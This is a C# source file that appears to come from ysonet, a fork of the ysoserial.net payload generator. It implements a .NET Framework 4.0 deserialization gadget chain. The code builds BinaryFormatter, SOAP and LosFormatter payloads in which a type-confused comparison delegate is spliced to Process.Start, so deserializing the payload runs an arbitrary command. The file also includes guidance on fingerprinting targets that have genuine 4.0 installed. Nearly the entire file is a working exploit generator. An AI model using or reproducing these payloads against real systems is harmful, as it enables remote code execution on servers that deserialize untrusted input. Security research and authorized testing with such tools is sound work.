using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Soap;
using System.Text;
using System.Xml;
using ysonet.Helpers;

namespace ysonet.Generators
{
    /*
     * TypeConfuseDelegateNetFx40 is the exact .NET Framework 4.0 counterpart
     * to TypeConfuseDelegate. Comparer<T>.Create and its serializable
     * ComparisonComparer<T> adapter arrived in 4.5, so the ordinary graph cannot
     * bind on 4.0.
     *
     * .NET Framework 4.0 still has Array.FunctorComparer<T>, with exactly two
     * FormatterServices members in source order: comparison, then c. Workflow's
     * ObjectSerializedRef reconstructs that non-serializable type:
     *
     *   List<object>[0] -> ObjectSerializedRef -> Array.FunctorComparer<string>
     *       comparison -> DelegateSerializationHolder -> String.Compare, Process.Start
     *       c          -> Comparer<string>.Default (BF/Los; null and unused in SOAP)
     *   List<object>[1] -> SortedSet<string>.OnDeserialization -> comparer.Compare
     *
     * The outer list order is load-bearing: the comparer must resolve before the
     * SortedSet callback rebuilds its tree. Later CLR 4 builds removed c, so this
     * graph deliberately targets exactly .NET Framework 4.0 and is not a fourth
     * root-container variant of the 4.5+ gadget.
     */
    public sealed class TypeConfuseDelegateNetFx40Generator : GenericGenerator
    {
        public override bool SupportsLegacyFx()
        {
            return false;
        }

        private const string WorkflowObjectRef =
            "System.Workflow.ComponentModel.Serialization.ActivitySurrogateSelector+"
            + "ObjectSurrogate+ObjectSerializedRef, System.Workflow.ComponentModel, "
            + "Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35";
        private const string FunctorComparer = "System.Array+FunctorComparer`1";
        private const string DelegateHolder = "System.DelegateSerializationHolder";
        private const string DelegateEntry =
            "System.DelegateSerializationHolder+DelegateEntry";
        private const string SoapListAliasNamespace =
            "YsonetTcdNet40SoapListProxy";
        private const string SoapListAliasType =
            "YsonetTcdNet40ListRootAlias";
        private const string SoapSetAliasNamespace =
            "YsonetTcdNet40SoapSetProxy";
        private const string SoapSetAliasType =
            "YsonetTcdNet40SetAlias";

        private static readonly Comparison<string> BenignComparison =
            new Comparison<string>(String.Compare);

        public override GadgetFacetSet Facets()
        {
            return new GadgetFacetSet()
                .WithKinds(PayloadKind.CodeExecution)
                .WithRequirements(GadgetRequirement.BuiltIn,
                    GadgetRequirement.NetFramework)
                .WithVersions(RuntimeVersion.NetFx40);
        }

        public override string Finders()
        {
            return "James Forshaw";
        }

        public override string Contributors()
        {
            return "Soroush Dalili";
        }

        public override string AdditionalInfo()
        {
            return ".NET Framework 4.0-only: reconstructs that runtime's non-serializable "
                + "Array.FunctorComparer<string> through Workflow ObjectSerializedRef, "
                + "preloads it before a SortedSet<string> in List<object>, and lets the set "
                + "call the confused String.Compare/Process.Start delegate while rebuilding. "
                + "The target needs System.Workflow.ComponentModel. BinaryFormatter, "
                + "SoapFormatter and LosFormatter are supported; the SOAP form is a direct "
                + "List<object>/SortedSet<string> document with no outer carrier or nested "
                + "BinaryFormatter stream. NetDataContractSerializer cannot reproduce the "
                + "required memberDatas contract. Later CLR 4 builds use an incompatible "
                + "private comparer shape, so local -t is refused; --legacyfx is also "
                + "invalid because this graph requires CLR4 identities. When to use it: only "
                + "when the target's INSTALLED framework is genuinely 4.0 (4.5+ never "
                + "installed). .NET 4.5+ replaces 4.0 in place, so on any 4.5 to 4.8 target "
                + "use TypeConfuseDelegate instead. That includes a 'v4.0' IIS app pool, "
                + "which selects CLR 4, not .NET 4.0, and a web.config targetFramework of "
                + "4.0, which only sets compatibility quirks. Decide by the installed "
                + "framework, not the app pool label: if HKLM ...NDP\\v4\\Full has a "
                + "'Release' value it is 4.5+, and absent means genuine 4.0. How to test it: "
                + "run ysonet.Net40TestHost.exe --probe on the target (shape=netfx40 confirms "
                + "genuine 4.0), then its --deserialize fires the payload; a Windows image "
                + "with 4.0 and no 4.5+ update, or an isolated 4.0 VM, is a suitable victim.";
        }

        public override List<string> Labels()
        {
            return new List<string> { GadgetTags.Independent };
        }

        public override List<string> SupportedFormatters()
        {
            return new List<string>
            {
                Formatters.BinaryFormatter,
                Formatters.SoapFormatter,
                Formatters.LosFormatter,
            };
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            if (inputArgs == null)
                throw new ArgumentNullException("inputArgs");
            // ysonet itself needs .NET Framework 4.7.2+, whose FunctorComparer has a
            // different private field set. An in-process -t would prove only rejection
            // on the wrong target while looking like a compatibility check.
            if (inputArgs.Test)
                throw new NotSupportedException(Name() + " targets exactly .NET Framework "
                    + "4.0 and cannot be self-tested in ysonet's .NET Framework 4.7.2+ "
                    + "process. Deserialize the payload on a target whose installed framework "
                    + "is genuinely .NET Framework 4.0 (a Windows image with 4.0 and no 4.5+ "
                    + "update, or an isolated 4.0 VM); a 4.5-4.8 machine will not fire it even "
                    + "when the app targets 4.0. Run ysonet.Net40TestHost.exe --probe there "
                    + "(shape=netfx40 confirms it), then its --deserialize to fire it.");
            if (!IsSupported(formatter))
                throw new NotSupportedException(formatter + " is not supported by "
                    + Name() + ".");

            InputArgs targetArgs = inputArgs.DeepCopy();
            if (formatter.Equals(Formatters.SoapFormatter,
                StringComparison.OrdinalIgnoreCase))
                return SerializeSoapCommand(targetArgs);

            return Serialize(BuildCommandGraph(targetArgs), formatter, targetArgs);
        }

        private static object BuildCommandGraph(InputArgs inputArgs)
        {
            ReadCommandFromFile(inputArgs);

            string executable = inputArgs.CmdFileName;
            string arguments = inputArgs.HasArguments ? inputArgs.CmdArguments : "";

            Delegate benign = BenignComparison;
            Comparison<string> confused =
                (Comparison<string>)MulticastDelegate.Combine(benign, benign);
            SpliceSlot1(confused, new Func<string, string, Process>(Process.Start));

            // The proxy's authoring comparison only orders the set while it is filled here;
            // the wire carries the confused delegate above. Ordering by ROLE puts the
            // executable in Process.Start's first parameter whatever the two strings sort like.
            var comparer = new FunctorComparerProxy(
                FillOrderPuttingTheExecutableLast(executable), confused, false);
            RejectEqualKeys(comparer, executable, arguments);

            var set = new SortedSet<string>(comparer);
            set.Add(executable);
            set.Add(arguments);

            // ObjectSerializedRef must resolve before SortedSet's callback asks the
            // comparer to order its two serialized items.
            return new List<object> { comparer, set };
        }

        private object SerializeSoapCommand(InputArgs inputArgs)
        {
            ReadCommandFromFile(inputArgs);

            string executable = inputArgs.CmdFileName;
            string arguments = inputArgs.HasArguments ? inputArgs.CmdArguments : "";

            var comparer = new FunctorComparerProxy(
                FillOrderPuttingTheExecutableLast(executable),
                new SoapDelegateProxy(
                    BenignComparison,
                    new Func<string, string, Process>(Process.Start)),
                true);
            RejectEqualKeys(comparer, executable, arguments);

            // The executable is written SECOND: the target compares the second item against
            // the first and hands it to Process.Start as the file name. Equal strings never
            // reach this point (RejectEqualKeys above).
            string[] items = new string[] { arguments, executable };
            var set = new SoapSetProxy(comparer, items);
            var root = new SoapListProxy(comparer, set);

            string payload;
            using (MemoryStream stream = new MemoryStream())
            {
                new SoapFormatter().Serialize(stream, root);
                payload = Encoding.UTF8.GetString(stream.ToArray());
            }

            XmlDocument document = new XmlDocument();
            document.PreserveWhitespace = true;
            document.LoadXml(payload);

            Type listType = typeof(List<object>);
            Type setType = typeof(SortedSet<string>);
            RewriteSoapTypeAlias(document, SoapListAliasNamespace,
                SoapListAliasType, listType.FullName, listType.Assembly.FullName);
            RewriteSoapTypeAlias(document, SoapSetAliasNamespace,
                SoapSetAliasType, setType.FullName, setType.Assembly.FullName);
            payload = document.OuterXml;

            if (inputArgs.Minify)
                payload = XmlMinifier.Minify(payload, null, null,
                    FormatterType.SoapFormatter, true);

            return FinishHandWrittenPayload(payload, Formatters.SoapFormatter,
                inputArgs, null, true);
        }

        private static void ReadCommandFromFile(InputArgs inputArgs)
        {
            string contents = inputArgs.CmdFromFile;
            if (!String.IsNullOrEmpty(contents))
                inputArgs.Cmd = contents;
        }

        // The set serializes its two elements smallest first, and the target compares the
        // SECOND one against the first, so that second element becomes Process.Start's file
        // name. Which string that is must not depend on how the operator's two strings sort:
        // the default "cmd" / "/c ..." pair is safe by construction, but --rawcmd removes that
        // wrapper and a command like "notepad.exe zzz.txt" sorts the executable BELOW its
        // argument, which used to build Process.Start("zzz.txt", "notepad.exe").
        //
        // This ordering is generation-only. It fills the set through the comparer PROXY, whose
        // authoring comparison never reaches the wire (the payload carries the spliced
        // delegate), so the bytes are unchanged for every command that already sorted the right
        // way round. Equality still comes from the benign comparison, so RejectEqualKeys still
        // sees an equal pair as equal.
        private static Comparison<string> FillOrderPuttingTheExecutableLast(string executable)
        {
            return delegate(string x, string y)
            {
                if (BenignComparison(x, y) == 0)
                    return 0;
                return String.Equals(x, executable, StringComparison.Ordinal) ? 1 : -1;
            };
        }

        private static void RejectEqualKeys(IComparer<string> comparer,
            string executable, string arguments)
        {
            if (comparer.Compare(executable, arguments) == 0)
                throw new ArgumentException(
                    "The .NET Framework 4.0 SortedSet requires the executable and argument "
                    + "strings to compare as distinct values (got \"" + executable
                    + "\" twice). Change the command so they differ; an equal-key set "
                    + "collapses to one item and does not fire.");
        }

        private static void SpliceSlot1(Comparison<string> comparison, Delegate slot1)
        {
            FieldInfo invocationList = typeof(MulticastDelegate).GetField(
                "_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
            object[] entries = comparison.GetInvocationList();
            entries[1] = slot1;
            invocationList.SetValue(comparison, entries);
        }

        private static Type RequireType(string assemblyQualifiedName)
        {
            Type type = Type.GetType(assemblyQualifiedName, false);
            if (type == null)
                throw new SerializationException("Required target type is unavailable: "
                    + assemblyQualifiedName);
            return type;
        }

        private static Type RequireType(Assembly assembly, string fullName)
        {
            Type type = assembly.GetType(fullName, false);
            if (type == null)
                throw new SerializationException("Required target type is unavailable: "
                    + fullName + " in " + assembly.FullName);
            return type;
        }

        private static void SetSoapAlias(SerializationInfo info,
            string aliasNamespace, string aliasType)
        {
            info.FullTypeName = aliasNamespace + "." + aliasType;
            info.AssemblyName = aliasNamespace;
        }

        [Serializable]
        private sealed class FunctorComparerProxy : IComparer<string>, ISerializable
        {
            private readonly Comparison<string> authoringComparison;
            private readonly object serializedComparison;
            private readonly bool soapCompatible;

            internal FunctorComparerProxy(Comparison<string> authoringComparison,
                object serializedComparison, bool soapCompatible)
            {
                if (authoringComparison == null)
                    throw new ArgumentNullException("authoringComparison");
                if (serializedComparison == null)
                    throw new ArgumentNullException("serializedComparison");

                this.authoringComparison = authoringComparison;
                this.serializedComparison = serializedComparison;
                this.soapCompatible = soapCompatible;
            }

            private FunctorComparerProxy(SerializationInfo info,
                StreamingContext context)
            {
                throw new NotSupportedException(
                    "The generation-only comparer proxy is never deserialized.");
            }

            public int Compare(string left, string right)
            {
                return authoringComparison(left, right);
            }

            public void GetObjectData(SerializationInfo info, StreamingContext context)
            {
                Type openFunctor = RequireType(
                    typeof(object).Assembly, FunctorComparer);
                info.SetType(RequireType(WorkflowObjectRef));
                info.AddValue("type",
                    openFunctor.MakeGenericType(typeof(string)));
                info.AddValue("memberDatas", new object[]
                {
                    serializedComparison,
                    // .NET Framework 4.0 FormatterServices member order is exactly
                    // comparison, c. Compare reads only comparison. SOAP cannot author
                    // the closed-generic default comparer, so that unused field is null.
                    soapCompatible ? null : Comparer<string>.Default,
                });
            }
        }

        [Serializable]
        private sealed class SoapDelegateEntryProxy : ISerializable
        {
            private readonly string delegateType;
            private readonly string delegateAssembly;
            private readonly string targetAssembly;
            private readonly string targetType;
            private readonly string method;
            private readonly SoapDelegateEntryProxy next;

            internal SoapDelegateEntryProxy(string delegateType,
                string delegateAssembly, string targetAssembly, string targetType,
                string method, SoapDelegateEntryProxy next)
            {
                this.delegateType = delegateType;
                this.delegateAssembly = delegateAssembly;
                this.targetAssembly = targetAssembly;
                this.targetType = targetType;
                this.method = method;
                this.next = next;
            }

            private SoapDelegateEntryProxy(SerializationInfo info,
                StreamingContext context)
            {
                throw new NotSupportedException(
                    "The generation-only delegate-entry proxy is never deserialized.");
            }

            public void GetObjectData(SerializationInfo info, StreamingContext context)
            {
                info.SetType(RequireType(typeof(object).Assembly, DelegateEntry));
                info.AddValue("type", delegateType);
                info.AddValue("assembly", delegateAssembly);
                info.AddValue("target", null);
                info.AddValue("targetTypeAssembly", targetAssembly);
                info.AddValue("targetTypeName", targetType);
                info.AddValue("methodName", method);
                info.AddValue("delegateEntry", next);
            }
        }

        [Serializable]
        private sealed class SoapDelegateProxy : ISerializable
        {
            private readonly SoapDelegateEntryProxy entry;
            private readonly MethodInfo attackerMethod;
            private readonly MethodInfo benignMethod;

            internal SoapDelegateProxy(Comparison<string> benignComparison,
                Delegate slot1)
            {
                if (slot1 == null)
                    throw new ArgumentNullException("slot1");
                if (benignComparison.Target != null || slot1.Target != null)
                    throw new ArgumentException("The direct SOAP form requires static "
                        + "methods in both invocation-list slots.");

                benignMethod = benignComparison.Method;
                attackerMethod = slot1.Method;

                SoapDelegateEntryProxy benign = new SoapDelegateEntryProxy(
                    benignComparison.GetType().FullName,
                    benignComparison.GetType().Assembly.FullName,
                    benignMethod.DeclaringType.Assembly.FullName,
                    benignMethod.DeclaringType.FullName,
                    benignMethod.Name,
                    null);

                // DelegateSerializationHolder stores the entries as a reverse-linked
                // list. Reconstruction restores String.Compare -> Process.Start.
                entry = new SoapDelegateEntryProxy(
                    slot1.GetType().FullName,
                    slot1.GetType().Assembly.FullName,
                    attackerMethod.DeclaringType.Assembly.FullName,
                    attackerMethod.DeclaringType.FullName,
                    attackerMethod.Name,
                    benign);
            }

            private SoapDelegateProxy(SerializationInfo info,
                StreamingContext context)
            {
                throw new NotSupportedException(
                    "The generation-only delegate proxy is never deserialized.");
            }

            public void GetObjectData(SerializationInfo info, StreamingContext context)
            {
                info.SetType(RequireType(typeof(object).Assembly, DelegateHolder));
                info.AddValue("Delegate", entry);
                info.AddValue("method0", attackerMethod);
                info.AddValue("method1", benignMethod);
            }
        }

        [Serializable]
        private sealed class SoapListProxy : ISerializable
        {
            private readonly object[] items;

            internal SoapListProxy(FunctorComparerProxy comparer, SoapSetProxy set)
            {
                items = new object[] { comparer, set };
            }

            private SoapListProxy(SerializationInfo info, StreamingContext context)
            {
                throw new NotSupportedException(
                    "The generation-only SOAP list proxy is never deserialized.");
            }

            public void GetObjectData(SerializationInfo info, StreamingContext context)
            {
                SetSoapAlias(info, SoapListAliasNamespace, SoapListAliasType);
                info.AddValue("_items", items, typeof(object[]));
                info.AddValue("_size", items.Length);
                info.AddValue("_version", items.Length);
            }
        }

        [Serializable]
        private sealed class SoapSetProxy : ISerializable
        {
            private readonly FunctorComparerProxy comparer;
            private readonly string[] items;

            internal SoapSetProxy(FunctorComparerProxy comparer, string[] items)
            {
                this.comparer = comparer;
                this.items = items;
            }

            private SoapSetProxy(SerializationInfo info, StreamingContext context)
            {
                throw new NotSupportedException(
                    "The generation-only SOAP set proxy is never deserialized.");
            }

            public void GetObjectData(SerializationInfo info, StreamingContext context)
            {
                SetSoapAlias(info, SoapSetAliasNamespace, SoapSetAliasType);
                info.AddValue("Count", items.Length);
                info.AddValue("Comparer", comparer, typeof(object));
                info.AddValue("Version", items.Length);
                info.AddValue("Items", items, typeof(string[]));
            }
        }
    }
}
